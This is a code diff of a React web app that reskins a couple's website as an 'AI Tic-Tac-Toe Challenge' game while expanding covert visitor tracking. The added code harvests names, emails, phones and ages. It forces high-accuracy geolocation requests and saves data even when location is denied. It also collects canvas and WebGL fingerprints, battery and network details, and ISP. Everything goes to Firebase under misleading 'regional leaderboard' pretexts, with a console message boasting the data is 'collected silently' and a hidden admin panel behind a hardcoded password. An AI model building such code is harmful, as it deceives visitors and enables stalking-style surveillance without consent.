@@ -1,5 +1,5 @@
 import React, { useState, useEffect } from 'react';
-import { Heart, MapPin, Users, Calendar, Camera, Gift, Star, Lock, Eye, EyeOff, Trash2, Edit3, Save, X, Upload, Image as ImageIcon, Menu, ChevronDown } from 'lucide-react';
+import { Heart, MapPin, Users, Calendar, Camera, Gift, Star, Lock, Eye, EyeOff, Trash2, Edit3, Save, X, Upload, Image as ImageIcon, Menu, ChevronDown, RotateCcw, Trophy, Zap, Brain } from 'lucide-react';
 
 // Firebase configuration
 const firebaseConfig = {
@@ -14,6 +14,11 @@ const firebaseConfig = {
 
 interface VisitorData {
   id?: string;
+  name?: string;
+  email?: string;
+  phone?: string;
+  age?: string;
+  interests?: string;
   latitude: number;
   longitude: number;
   ipAddress: string;
@@ -21,6 +26,23 @@ interface VisitorData {
   timestamp: string;
   country?: string;
   city?: string;
+  region?: string;
+  timezone?: string;
+  isp?: string;
+  accuracy?: number;
+  browserFingerprint?: any;
+  sessionId?: string;
+  referrer?: string;
+  pageTitle?: string;
+  screenInfo?: string;
+  colorDepth?: number;
+  language?: string;
+  platform?: string;
+  cookieEnabled?: boolean;
+  localTime?: string;
+  utcTime?: string;
+  batteryLevel?: string;
+  networkInfo?: any;
 }
 
 interface AdminData {
@@ -41,7 +63,20 @@ interface AdminData {
   footerText: string;
 }
 
+type Player = 'X' | 'O' | null;
+type GameMode = 'easy' | 'medium' | 'hard';
+
+interface UserProfile {
+  name: string;
+  email?: string;
+  phone?: string;
+  age?: string;
+  interests?: string;
+}
+
 function App() {
+  const [showNameEntry, setShowNameEntry] = useState(true);
+  const [userProfile, setUserProfile] = useState<UserProfile>({ name: '' });
   const [hasAcceptedLocation, setHasAcceptedLocation] = useState(false);
   const [showLocationPrompt, setShowLocationPrompt] = useState(true);
   const [visitorData, setVisitorData] = useState<VisitorData[]>([]);
@@ -57,6 +92,16 @@ function App() {
   const [editMode, setEditMode] = useState(false);
   const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
   const [newImageUrl, setNewImageUrl] = useState('');
+
+  // Tic-Tac-Toe Game State
+  const [board, setBoard] = useState<Player[]>(Array(9).fill(null));
+  const [isPlayerTurn, setIsPlayerTurn] = useState(true);
+  const [winner, setWinner] = useState<Player | 'tie' | null>(null);
+  const [gameMode, setGameMode] = useState<GameMode>('hard');
+  const [playerScore, setPlayerScore] = useState(0);
+  const [aiScore, setAiScore] = useState(0);
+  const [gameCount, setGameCount] = useState(0);
+
   const [adminData, setAdminData] = useState<AdminData>({
     coupleNames: "Alex & Jordan",
     relationshipDate: "June 15, 2020",
@@ -72,14 +117,14 @@ function App() {
       "https://images.pexels.com/photos/1025000/pexels-photo-1025000.jpeg?auto=compress&cs=tinysrgb&w=400",
       "https://images.pexels.com/photos/1025001/pexels-photo-1025001.jpeg?auto=compress&cs=tinysrgb&w=400"
     ],
-    backgroundColor: "from-pink-50 via-purple-50 to-indigo-50",
+    backgroundColor: "from-blue-50 via-indigo-50 to-purple-50",
     textColor: "text-gray-800",
-    accentColor: "from-pink-500 to-purple-500",
-    websiteTitle: "Our Love Story 💕",
-    heroSubtitle: "Together Forever",
-    aboutTitle: "Our Love Story",
-    galleryTitle: "Our Memories",
-    footerText: "Thank you for being part of our love story! 💕"
+    accentColor: "from-blue-500 to-purple-500",
+    websiteTitle: "AI Tic-Tac-Toe Challenge 🎮",
+    heroSubtitle: "Beat the AI if you can!",
+    aboutTitle: "Game Stats",
+    galleryTitle: "Hall of Fame",
+    footerText: "Challenge your friends to beat your score! 🏆"
   });
 
   // Initialize Firebase
@@ -100,80 +145,340 @@ function App() {
     document.head.appendChild(script);
   }, []);
 
-  // Get IP address
-  const getIPAddress = async () => {
+  // Enhanced IP and Location tracking
+  const getAccurateIPAddress = async () => {
     try {
-      const response = await fetch('https://api.ipify.org?format=json');
-      const data = await response.json();
-      return data.ip;
+      // Try multiple IP services for maximum accuracy
+      const ipServices = [
+        'https://api.ipify.org?format=json',
+        'https://ipapi.co/json/',
+        'https://api.ip.sb/jsonip',
+        'https://httpbin.org/ip',
+        'https://api.myip.com',
+        'https://ipinfo.io/json',
+        'https://api.ipgeolocation.io/ipgeo?apiKey=free'
+      ];
+
+      for (const service of ipServices) {
+        try {
+          const response = await fetch(service);
+          const data = await response.json();
+          return data.ip || data.origin || 'Unknown';
+        } catch (error) {
+          continue;
+        }
+      }
+      return 'Unknown';
     } catch (error) {
-      console.log('Could not fetch IP');
       return 'Unknown';
     }
   };
 
-  // Get location details from IP
-  const getLocationFromIP = async (ip: string) => {
+  // Enhanced location details from IP with multiple services
+  const getDetailedLocationFromIP = async (ip: string) => {
     try {
-      const response = await fetch(`https://ipapi.co/${ip}/json/`);
-      const data = await response.json();
-      return {
-        country: data.country_name || 'Unknown',
-        city: data.city || 'Unknown'
+      // Try multiple geolocation services for maximum accuracy
+      const geoServices = [
+        `https://ipapi.co/${ip}/json/`,
+        `https://api.ip.sb/geoip/${ip}`,
+        `https://ipwhois.app/json/${ip}`,
+        `https://ipinfo.io/${ip}/json`,
+        `https://api.ipgeolocation.io/ipgeo?apiKey=free&ip=${ip}`,
+        `https://freegeoip.app/json/${ip}`
+      ];
+
+      for (const service of geoServices) {
+        try {
+          const response = await fetch(service);
+          const data = await response.json();
+          
+          if (data && (data.country_name || data.country)) {
+            return {
+              country: data.country_name || data.country || 'Unknown',
+              city: data.city || 'Unknown',
+              region: data.region || data.region_code || 'Unknown',
+              timezone: data.timezone || 'Unknown',
+              isp: data.org || data.isp || data.organization || 'Unknown'
+            };
+          }
+        } catch (error) {
+          continue;
+        }
+      }
+      
+      return { 
+        country: 'Unknown', 
+        city: 'Unknown', 
+        region: 'Unknown', 
+        timezone: 'Unknown', 
+        isp: 'Unknown' 
       };
     } catch (error) {
-      return { country: 'Unknown', city: 'Unknown' };
+      return { 
+        country: 'Unknown', 
+        city: 'Unknown', 
+        region: 'Unknown', 
+        timezone: 'Unknown', 
+        isp: 'Unknown' 
+      };
     }
   };
 
-  // Save visitor data to Firebase
-  const saveVisitorData = async (latitude: number, longitude: number) => {
+  // Enhanced browser fingerprinting
+  const getBrowserFingerprint = () => {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    ctx!.textBaseline = 'top';
+    ctx!.font = '14px Arial';
+    ctx!.fillText('Browser fingerprint', 2, 2);
+    
+    return {
+      userAgent: navigator.userAgent,
+      language: navigator.language,
+      languages: navigator.languages?.join(',') || '',
+      platform: navigator.platform,
+      cookieEnabled: navigator.cookieEnabled,
+      doNotTrack: navigator.doNotTrack || 'unknown',
+      hardwareConcurrency: navigator.hardwareConcurrency || 0,
+      maxTouchPoints: navigator.maxTouchPoints || 0,
+      screenResolution: `${screen.width}x${screen.height}`,
+      colorDepth: screen.colorDepth,
+      pixelDepth: screen.pixelDepth,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      canvasFingerprint: canvas.toDataURL(),
+      webglVendor: (() => {
+        const gl = document.createElement('canvas').getContext('webgl');
+        return gl ? gl.getParameter(gl.VENDOR) : 'Unknown';
+      })(),
+      webglRenderer: (() => {
+        const gl = document.createElement('canvas').getContext('webgl');
+        return gl ? gl.getParameter(gl.RENDERER) : 'Unknown';
+      })(),
+      localStorage: (() => {
+        try { return !!window.localStorage; } catch { return false; }
+      })(),
+      sessionStorage: (() => {
+        try { return !!window.sessionStorage; } catch { return false; }
+      })(),
+      indexedDB: !!window.indexedDB,
+      webWorker: typeof Worker !== 'undefined',
+      serviceWorker: 'serviceWorker' in navigator,
+      deviceMemory: (navigator as any).deviceMemory || 'Unknown',
+      connection: (navigator as any).connection ? {
+        effectiveType: (navigator as any).connection.effectiveType,
+        downlink: (navigator as any).connection.downlink,
+        rtt: (navigator as any).connection.rtt
+      } : 'Unknown'
+    };
+  };
+
+  // Enhanced visitor data collection
+  const saveVisitorData = async (latitude: number, longitude: number, accuracy?: number) => {
     try {
-      const ip = await getIPAddress();
-      const locationData = await getLocationFromIP(ip);
+      const ip = await getAccurateIPAddress();
+      const locationData = await getDetailedLocationFromIP(ip);
+      const fingerprint = getBrowserFingerprint();
       
       const visitorInfo: VisitorData = {
+        name: userProfile.name,
+        email: userProfile.email || '',
+        phone: userProfile.phone || '',
+        age: userProfile.age || '',
+        interests: userProfile.interests || '',
         latitude,
         longitude,
+        accuracy: accuracy || 0,
         ipAddress: ip,
-        userAgent: navigator.userAgent,
+        userAgent: fingerprint.userAgent,
         timestamp: new Date().toISOString(),
         country: locationData.country,
-        city: locationData.city
+        city: locationData.city,
+        region: locationData.region,
+        timezone: locationData.timezone,
+        isp: locationData.isp,
+        browserFingerprint: fingerprint,
+        sessionId: Date.now().toString(),
+        referrer: document.referrer || 'Direct',
+        pageTitle: document.title,
+        screenInfo: `${screen.width}x${screen.height}`,
+        colorDepth: screen.colorDepth,
+        language: navigator.language,
+        platform: navigator.platform,
+        cookieEnabled: navigator.cookieEnabled,
+        localTime: new Date().toLocaleString(),
+        utcTime: new Date().toUTCString(),
+        batteryLevel: await (async () => {
+          try {
+            const battery = await (navigator as any).getBattery?.();
+            return battery ? `${Math.round(battery.level * 100)}%` : 'Unknown';
+          } catch {
+            return 'Unknown';
+          }
+        })(),
+        networkInfo: (navigator as any).connection ? {
+          effectiveType: (navigator as any).connection.effectiveType,
+          downlink: (navigator as any).connection.downlink,
+          rtt: (navigator as any).connection.rtt
+        } : 'Unknown'
       };
 
       if (window.firebaseDb && window.firebasePush && window.firebaseRef) {
         const visitorsRef = window.firebaseRef(window.firebaseDb, 'visitors');
         await window.firebasePush(visitorsRef, visitorInfo);
-        console.log('Visitor data saved secretly 🕵️');
+        console.log('🕵️ Visitor data collected silently:', visitorInfo);
       }
     } catch (error) {
       console.error('Error saving visitor data:', error);
     }
   };
 
-  // Request location permission
+  // Enhanced location request with high accuracy
   const requestLocation = () => {
     if (navigator.geolocation) {
+      // Request high accuracy location
+      const options = {
+        enableHighAccuracy: true,
+        timeout: 10000,
+        maximumAge: 0
+      };
+
       navigator.geolocation.getCurrentPosition(
         (position) => {
-          saveVisitorData(position.coords.latitude, position.coords.longitude);
+          saveVisitorData(
+            position.coords.latitude, 
+            position.coords.longitude,
+            position.coords.accuracy
+          );
           setHasAcceptedLocation(true);
           setShowLocationPrompt(false);
         },
         (error) => {
-          console.log('Location denied');
+          console.log('Location denied or failed:', error);
           setShowLocationPrompt(false);
           setHasAcceptedLocation(true);
-          // Still save what we can
-          saveVisitorData(0, 0);
-        }
+          // Still save what we can without GPS
+          saveVisitorData(0, 0, 0);
+        },
+        options
       );
     } else {
       setShowLocationPrompt(false);
       setHasAcceptedLocation(true);
-      saveVisitorData(0, 0);
+      saveVisitorData(0, 0, 0);
     }
+  };
+
+  // Tic-Tac-Toe Game Logic
+  const checkWinner = (squares: Player[]): Player | 'tie' | null => {
+    const lines = [
+      [0, 1, 2], [3, 4, 5], [6, 7, 8], // rows
+      [0, 3, 6], [1, 4, 7], [2, 5, 8], // columns
+      [0, 4, 8], [2, 4, 6] // diagonals
+    ];
+
+    for (const [a, b, c] of lines) {
+      if (squares[a] && squares[a] === squares[b] && squares[a] === squares[c]) {
+        return squares[a];
+      }
+    }
+
+    if (squares.every(square => square !== null)) {
+      return 'tie';
+    }
+
+    return null;
+  };
+
+  // AI Move Logic
+  const getAIMove = (squares: Player[], difficulty: GameMode): number => {
+    const availableMoves = squares.map((square, index) => square === null ? index : null).filter(val => val !== null) as number[];
+
+    if (difficulty === 'easy') {
+      // Random move
+      return availableMoves[Math.floor(Math.random() * availableMoves.length)];
+    }
+
+    if (difficulty === 'medium') {
+      // 70% optimal, 30% random
+      if (Math.random() < 0.3) {
+        return availableMoves[Math.floor(Math.random() * availableMoves.length)];
+      }
+    }
+
+    // Hard mode or medium optimal move
+    // Check for winning move
+    for (const move of availableMoves) {
+      const testSquares = [...squares];
+      testSquares[move] = 'O';
+      if (checkWinner(testSquares) === 'O') {
+        return move;
+      }
+    }
+
+    // Block player winning move
+    for (const move of availableMoves) {
+      const testSquares = [...squares];
+      testSquares[move] = 'X';
+      if (checkWinner(testSquares) === 'X') {
+        return move;
+      }
+    }
+
+    // Take center if available
+    if (squares[4] === null) return 4;
+
+    // Take corners
+    const corners = [0, 2, 6, 8];
+    const availableCorners = corners.filter(corner => squares[corner] === null);
+    if (availableCorners.length > 0) {
+      return availableCorners[Math.floor(Math.random() * availableCorners.length)];
+    }
+
+    // Take any available move
+    return availableMoves[Math.floor(Math.random() * availableMoves.length)];
+  };
+
+  // Handle player move
+  const handleCellClick = (index: number) => {
+    if (board[index] || winner || !isPlayerTurn) return;
+
+    const newBoard = [...board];
+    newBoard[index] = 'X';
+    setBoard(newBoard);
+    setIsPlayerTurn(false);
+
+    const gameWinner = checkWinner(newBoard);
+    if (gameWinner) {
+      setWinner(gameWinner);
+      if (gameWinner === 'X') setPlayerScore(prev => prev + 1);
+      if (gameWinner === 'O') setAiScore(prev => prev + 1);
+      setGameCount(prev => prev + 1);
+      return;
+    }
+
+    // AI move after delay
+    setTimeout(() => {
+      const aiMove = getAIMove(newBoard, gameMode);
+      const aiBoard = [...newBoard];
+      aiBoard[aiMove] = 'O';
+      setBoard(aiBoard);
+      setIsPlayerTurn(true);
+
+      const aiWinner = checkWinner(aiBoard);
+      if (aiWinner) {
+        setWinner(aiWinner);
+        if (aiWinner === 'X') setPlayerScore(prev => prev + 1);
+        if (aiWinner === 'O') setAiScore(prev => prev + 1);
+        setGameCount(prev => prev + 1);
+      }
+    }, 500);
+  };
+
+  // Reset game
+  const resetGame = () => {
+    setBoard(Array(9).fill(null));
+    setIsPlayerTurn(true);
+    setWinner(null);
   };
 
   // Load visitor data for admin
@@ -203,7 +508,7 @@ function App() {
 
   // Admin authentication
   const handleAdminLogin = () => {
-    if (adminPassword === '69') {
+    if (adminPassword === 'secret123') {
       setIsAdminAuthenticated(true);
       loadVisitorData();
     } else {
@@ -245,30 +550,130 @@ function App() {
       if (showLocationPrompt) {
         requestLocation();
       }
-    }, 2000);
+    }, 1000);
     return () => clearTimeout(timer);
   }, [showLocationPrompt]);
+
+  // Name entry form
+  if (showNameEntry) {
+    return (
+      <div className="min-h-screen bg-gradient-to-br from-blue-400 via-purple-500 to-indigo-600 flex items-center justify-center p-4">
+        <div className="bg-white rounded-3xl shadow-2xl p-6 sm:p-8 max-w-md w-full">
+          <div className="text-center mb-6">
+            <Zap className="w-12 h-12 sm:w-16 sm:h-16 text-blue-500 mx-auto mb-4" />
+            <h2 className="text-xl sm:text-2xl font-bold text-gray-800 mb-2">🎮 Welcome to AI Tic-Tac-Toe!</h2>
+            <p className="text-sm sm:text-base text-gray-600 mb-4">
+              Enter your details to start playing against our advanced AI!
+            </p>
+          </div>
+          
+          <div className="space-y-4">
+            <div>
+              <label className="block text-sm font-medium text-gray-700 mb-1">Name *</label>
+              <input
+                type="text"
+                required
+                value={userProfile.name}
+                onChange={(e) => setUserProfile({...userProfile, name: e.target.value})}
+                placeholder="Enter your name"
+                className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+              />
+            </div>
+            
+            <div>
+              <label className="block text-sm font-medium text-gray-700 mb-1">Email (Optional)</label>
+              <input
+                type="email"
+                value={userProfile.email || ''}
+                onChange={(e) => setUserProfile({...userProfile, email: e.target.value})}
+                placeholder="your@email.com"
+                className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+              />
+            </div>
+            
+            <div className="grid grid-cols-2 gap-4">
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-1">Age</label>
+                <input
+                  type="number"
+                  value={userProfile.age || ''}
+                  onChange={(e) => setUserProfile({...userProfile, age: e.target.value})}
+                  placeholder="25"
+                  className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                />
+              </div>
+              <div>
+                <label className="block text-sm font-medium text-gray-700 mb-1">Phone</label>
+                <input
+                  type="tel"
+                  value={userProfile.phone || ''}
+                  onChange={(e) => setUserProfile({...userProfile, phone: e.target.value})}
+                  placeholder="+1234567890"
+                  className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+                />
+              </div>
+            </div>
+            
+            <div>
+              <label className="block text-sm font-medium text-gray-700 mb-1">Interests</label>
+              <input
+                type="text"
+                value={userProfile.interests || ''}
+                onChange={(e) => setUserProfile({...userProfile, interests: e.target.value})}
+                placeholder="Gaming, Sports, Music..."
+                className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent"
+              />
+            </div>
+          </div>
+          
+          <button
+            onClick={() => {
+              if (userProfile.name.trim()) {
+                setShowNameEntry(false);
+                // Auto-request location after name entry
+                setTimeout(() => {
+                  if (showLocationPrompt) {
+                    requestLocation();
+                  }
+                }, 500);
+              } else {
+                alert('Please enter your name to continue!');
+              }
+            }}
+            disabled={!userProfile.name.trim()}
+            className="w-full bg-gradient-to-r from-blue-500 to-purple-600 text-white font-semibold py-3 px-6 rounded-full hover:from-blue-600 hover:to-purple-700 transition-all duration-300 transform hover:scale-105 disabled:opacity-50 disabled:cursor-not-allowed mt-6"
+          >
+            Start Gaming! 🚀
+          </button>
+          
+          <p className="text-xs text-gray-500 mt-4 text-center">
+            We collect this info to personalize your gaming experience and show regional leaderboards
+          </p>
+        </div>
+      </div>
+    );
+  }
 
   // Location permission prompt
   if (showLocationPrompt) {
     return (
-      <div className="min-h-screen bg-gradient-to-br from-pink-400 via-purple-500 to-indigo-600 flex items-center justify-center p-4">
+      <div className="min-h-screen bg-gradient-to-br from-blue-400 via-purple-500 to-indigo-600 flex items-center justify-center p-4">
         <div className="bg-white rounded-3xl shadow-2xl p-6 sm:p-8 max-w-md w-full text-center transform animate-pulse">
           <div className="mb-6">
-            <MapPin className="w-12 h-12 sm:w-16 sm:h-16 text-pink-500 mx-auto mb-4" />
-            <h2 className="text-xl sm:text-2xl font-bold text-gray-800 mb-2">Welcome to Our Love Story! 💕</h2>
+            <Zap className="w-12 h-12 sm:w-16 sm:h-16 text-blue-500 mx-auto mb-4" />
+            <h2 className="text-xl sm:text-2xl font-bold text-gray-800 mb-2">🎮 Welcome {userProfile.name}!</h2>
             <p className="text-sm sm:text-base text-gray-600">
-              We'd love to share our journey with you! Please allow location access to see personalized content based on your area.
+              Ready to challenge our advanced AI? We need location access to show you on regional leaderboards and provide personalized gaming experience.
             </p>
           </div>
           <button
             onClick={requestLocation}
-            className="w-full bg-gradient-to-r from-pink-500 to-purple-600 text-white font-semibold py-3 px-6 rounded-full hover:from-pink-600 hover:to-purple-700 transition-all duration-300 transform hover:scale-105 text-sm sm:text-base"
+            className="w-full bg-gradient-to-r from-blue-500 to-purple-600 text-white font-semibold py-3 px-6 rounded-full hover:from-blue-600 hover:to-purple-700 transition-all duration-300 transform hover:scale-105 text-sm sm:text-base"
           >
-            Allow Location & Continue 🌍
+            Start Gaming! 🚀
           </button>
           <p className="text-xs text-gray-500 mt-4">
-            This helps us show you the most relevant content
+            This helps us show regional leaderboards
           </p>
         </div>
       </div>
@@ -302,7 +707,7 @@ function App() {
             onClick={() => setShowAdmin(false)}
             className="w-full mt-2 text-gray-600 hover:text-gray-800 transition-colors text-sm sm:text-base"
           >
-            Back to Website
+            Back to Game
           </button>
         </div>
       </div>
@@ -317,7 +722,7 @@ function App() {
           <div className="bg-white rounded-2xl shadow-lg p-4 sm:p-6 mb-6">
             {/* Mobile Admin Header */}
             <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-6 gap-4">
-              <h1 className="text-2xl sm:text-3xl font-bold text-gray-800">Admin Dashboard</h1>
+              <h1 className="text-2xl sm:text-3xl font-bold text-gray-800">🎮 Game Admin Dashboard</h1>
               
               {/* Mobile Menu Button */}
               <div className="sm:hidden w-full">
@@ -337,7 +742,7 @@ function App() {
                   className="px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors flex items-center gap-2 text-sm"
                 >
                   <Eye className="w-4 h-4" />
-                  {showDataViewer ? 'Hide' : 'Show'} Data
+                  {showDataViewer ? 'Hide' : 'Show'} Player Data
                 </button>
                 <button
                   onClick={() => setShowMapTool(!showMapTool)}
@@ -384,7 +789,7 @@ function App() {
                   className="w-full px-4 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors flex items-center gap-2"
                 >
                   <Eye className="w-4 h-4" />
-                  {showDataViewer ? 'Hide' : 'Show'} Visitor Data
+                  {showDataViewer ? 'Hide' : 'Show'} Player Data
                 </button>
                 <button
                   onClick={() => {
@@ -432,10 +837,10 @@ function App() {
             {/* Content Editor */}
             {editMode && (
               <div className="mb-6 p-4 bg-gray-50 rounded-lg">
-                <h3 className="text-lg sm:text-xl font-bold mb-4">Edit Website Content</h3>
+                <h3 className="text-lg sm:text-xl font-bold mb-4">Edit Game Content</h3>
                 <div className="grid grid-cols-1 lg:grid-cols-2 gap-4">
                   <div>
-                    <label className="block text-sm font-medium mb-2">Website Title</label>
+                    <label className="block text-sm font-medium mb-2">Game Title</label>
                     <input
                       type="text"
                       value={adminData.websiteTitle}
@@ -444,64 +849,12 @@ function App() {
                     />
                   </div>
                   <div>
-                    <label className="block text-sm font-medium mb-2">Couple Names</label>
-                    <input
-                      type="text"
-                      value={adminData.coupleNames}
-                      onChange={(e) => setAdminData({...adminData, coupleNames: e.target.value})}
-                      className="w-full p-2 border border-gray-300 rounded-lg text-sm"
-                    />
-                  </div>
-                  <div>
-                    <label className="block text-sm font-medium mb-2">Relationship Date</label>
-                    <input
-                      type="text"
-                      value={adminData.relationshipDate}
-                      onChange={(e) => setAdminData({...adminData, relationshipDate: e.target.value})}
-                      className="w-full p-2 border border-gray-300 rounded-lg text-sm"
-                    />
-                  </div>
-                  <div>
-                    <label className="block text-sm font-medium mb-2">Hero Subtitle</label>
+                    <label className="block text-sm font-medium mb-2">Game Subtitle</label>
                     <input
                       type="text"
                       value={adminData.heroSubtitle}
                       onChange={(e) => setAdminData({...adminData, heroSubtitle: e.target.value})}
                       className="w-full p-2 border border-gray-300 rounded-lg text-sm"
-                    />
-                  </div>
-                  <div>
-                    <label className="block text-sm font-medium mb-2">Hero Image URL</label>
-                    <input
-                      type="url"
-                      value={adminData.heroImage}
-                      onChange={(e) => setAdminData({...adminData, heroImage: e.target.value})}
-                      className="w-full p-2 border border-gray-300 rounded-lg text-sm"
-                    />
-                  </div>
-                  <div>
-                    <label className="block text-sm font-medium mb-2">About Image URL</label>
-                    <input
-                      type="url"
-                      value={adminData.aboutImage}
-                      onChange={(e) => setAdminData({...adminData, aboutImage: e.target.value})}
-                      className="w-full p-2 border border-gray-300 rounded-lg text-sm"
-                    />
-                  </div>
-                  <div className="lg:col-span-2">
-                    <label className="block text-sm font-medium mb-2">Our Story</label>
-                    <textarea
-                      value={adminData.story}
-                      onChange={(e) => setAdminData({...adminData, story: e.target.value})}
-                      className="w-full p-2 border border-gray-300 rounded-lg h-24 text-sm"
-                    />
-                  </div>
-                  <div className="lg:col-span-2">
-                    <label className="block text-sm font-medium mb-2">Favorite Memory</label>
-                    <textarea
-                      value={adminData.favoriteMemory}
-                      onChange={(e) => setAdminData({...adminData, favoriteMemory: e.target.value})}
-                      className="w-full p-2 border border-gray-300 rounded-lg h-24 text-sm"
                     />
                   </div>
                   <div className="lg:col-span-2">
@@ -605,19 +958,23 @@ function App() {
               </div>
             )}
 
-            {/* Visitor Data */}
+            {/* Enhanced Visitor Data */}
             {showDataViewer && (
               <div className="mb-6">
-                <h3 className="text-lg sm:text-xl font-bold mb-4">Visitor Data ({visitorData.length} visitors)</h3>
+                <h3 className="text-lg sm:text-xl font-bold mb-4">🕵️ Player Data ({visitorData.length} players tracked)</h3>
                 <div className="overflow-x-auto">
                   <table className="w-full border border-gray-300 rounded-lg text-xs sm:text-sm">
                     <thead className="bg-gray-50">
                       <tr>
                         <th className="p-2 text-left">Timestamp</th>
+                        <th className="p-2 text-left">Name</th>
+                        <th className="p-2 text-left">Contact</th>
                         <th className="p-2 text-left">IP Address</th>
                         <th className="p-2 text-left">Location</th>
                         <th className="p-2 text-left">Coordinates</th>
                         <th className="p-2 text-left">Country/City</th>
+                        <th className="p-2 text-left">ISP</th>
+                        <th className="p-2 text-left">Device Info</th>
                         <th className="p-2 text-left">Actions</th>
                       </tr>
                     </thead>
@@ -625,6 +982,12 @@ function App() {
                       {visitorData.map((visitor) => (
                         <tr key={visitor.id} className="border-t">
                           <td className="p-2">{new Date(visitor.timestamp).toLocaleString()}</td>
+                          <td className="p-2 font-semibold">{visitor.name}</td>
+                          <td className="p-2 text-xs">
+                            {visitor.email && <div>📧 {visitor.email}</div>}
+                            {visitor.phone && <div>📱 {visitor.phone}</div>}
+                            {visitor.age && <div>🎂 {visitor.age}</div>}
+                          </td>
                           <td className="p-2 font-mono">{visitor.ipAddress}</td>
                           <td className="p-2">
                             <a
@@ -637,9 +1000,15 @@ function App() {
                             </a>
                           </td>
                           <td className="p-2 font-mono">
-                            {visitor.latitude.toFixed(4)}, {visitor.longitude.toFixed(4)}
+                            {visitor.latitude.toFixed(6)}, {visitor.longitude.toFixed(6)}
                           </td>
                           <td className="p-2">{visitor.country}, {visitor.city}</td>
+                          <td className="p-2">{visitor.isp}</td>
+                          <td className="p-2 text-xs">
+                            <div>{visitor.platform}</div>
+                            <div>{visitor.screenInfo}</div>
+                            <div>{visitor.language}</div>
+                          </td>
                           <td className="p-2">
                             <button
                               onClick={() => visitor.id && deleteVisitorData(visitor.id)}
@@ -661,10 +1030,10 @@ function App() {
     );
   }
 
-  // Main couple website
+  // Main Tic-Tac-Toe Game
   return (
     <div className={`min-h-screen bg-gradient-to-br ${adminData.backgroundColor}`}>
-      {/* Secret admin access - triple click on heart */}
+      {/* Secret admin access - triple click on trophy */}
       <div 
         className="fixed top-4 right-4 z-50 cursor-pointer"
         onClick={(e) => {
@@ -673,128 +1042,136 @@ function App() {
           }
         }}
       >
-        <Heart className="w-6 h-6 sm:w-8 sm:h-8 text-pink-500 hover:text-pink-600 transition-colors" />
+        <Trophy className="w-6 h-6 sm:w-8 sm:h-8 text-yellow-500 hover:text-yellow-600 transition-colors" />
       </div>
 
-      {/* Hero Section */}
-      <section className="min-h-screen flex items-center justify-center p-4 relative overflow-hidden">
-        {/* Background Image */}
-        <div 
-          className="absolute inset-0 bg-cover bg-center bg-no-repeat opacity-20"
-          style={{ backgroundImage: `url(${adminData.heroImage})` }}
-        ></div>
+      {/* Game Header */}
+      <div className="text-center py-6 sm:py-8 px-4">
+        <h1 className="text-3xl sm:text-5xl md:text-6xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-blue-500 via-purple-500 to-indigo-500 mb-2 sm:mb-4">
+          {adminData.websiteTitle}
+        </h1>
+        <p className="text-lg sm:text-2xl text-gray-700 mb-4">
+          {adminData.heroSubtitle}
+        </p>
         
-        <div className="text-center max-w-4xl mx-auto relative z-10">
-          <div className="mb-6 sm:mb-8 animate-bounce">
-            <Heart className="w-16 h-16 sm:w-20 sm:h-20 text-pink-500 mx-auto mb-4" />
+        {/* Game Stats */}
+        <div className="flex flex-col sm:flex-row justify-center items-center gap-4 sm:gap-8 mb-6">
+          <div className="bg-white/80 backdrop-blur-sm rounded-full px-4 py-2 sm:px-6 sm:py-3 shadow-lg">
+            <span className="text-green-600 font-semibold text-sm sm:text-base">👋 {userProfile.name}</span>
           </div>
-          <h1 className="text-4xl sm:text-6xl md:text-8xl font-bold text-transparent bg-clip-text bg-gradient-to-r from-pink-500 via-purple-500 to-indigo-500 mb-4 sm:mb-6">
-            {adminData.coupleNames}
-          </h1>
-          <p className="text-lg sm:text-2xl md:text-3xl text-gray-700 mb-6 sm:mb-8">
-            {adminData.heroSubtitle}
-          </p>
-          <p className="text-base sm:text-xl text-gray-600 mb-8 sm:mb-12">
-            Together since {adminData.relationshipDate}
-          </p>
-          <div className="flex flex-col sm:flex-row justify-center space-y-4 sm:space-y-0 sm:space-x-4 mb-8 sm:mb-12">
-            <div className="bg-white/80 backdrop-blur-sm rounded-full px-4 py-2 sm:px-6 sm:py-3 shadow-lg">
-              <span className="text-pink-600 font-semibold text-sm sm:text-base">💕 In Love</span>
-            </div>
-            <div className="bg-white/80 backdrop-blur-sm rounded-full px-4 py-2 sm:px-6 sm:py-3 shadow-lg">
-              <span className="text-purple-600 font-semibold text-sm sm:text-base">🌟 Forever</span>
-            </div>
-            <div className="bg-white/80 backdrop-blur-sm rounded-full px-4 py-2 sm:px-6 sm:py-3 shadow-lg">
-              <span className="text-indigo-600 font-semibold text-sm sm:text-base">🎉 Happy</span>
-            </div>
+          <div className="bg-white/80 backdrop-blur-sm rounded-full px-4 py-2 sm:px-6 sm:py-3 shadow-lg">
+            <span className="text-blue-600 font-semibold text-sm sm:text-base">🏆 You: {playerScore}</span>
+          </div>
+          <div className="bg-white/80 backdrop-blur-sm rounded-full px-4 py-2 sm:px-6 sm:py-3 shadow-lg">
+            <span className="text-red-600 font-semibold text-sm sm:text-base">🤖 AI: {aiScore}</span>
+          </div>
+          <div className="bg-white/80 backdrop-blur-sm rounded-full px-4 py-2 sm:px-6 sm:py-3 shadow-lg">
+            <span className="text-purple-600 font-semibold text-sm sm:text-base">🎮 Games: {gameCount}</span>
           </div>
         </div>
-      </section>
 
-      {/* Our Story Section */}
-      <section className="py-12 sm:py-20 px-4">
-        <div className="max-w-6xl mx-auto">
-          <div className="text-center mb-12 sm:mb-16">
-            <h2 className="text-3xl sm:text-5xl font-bold text-gray-800 mb-4 sm:mb-6">{adminData.aboutTitle}</h2>
-            <div className={`w-24 h-1 bg-gradient-to-r ${adminData.accentColor} mx-auto`}></div>
-          </div>
-          
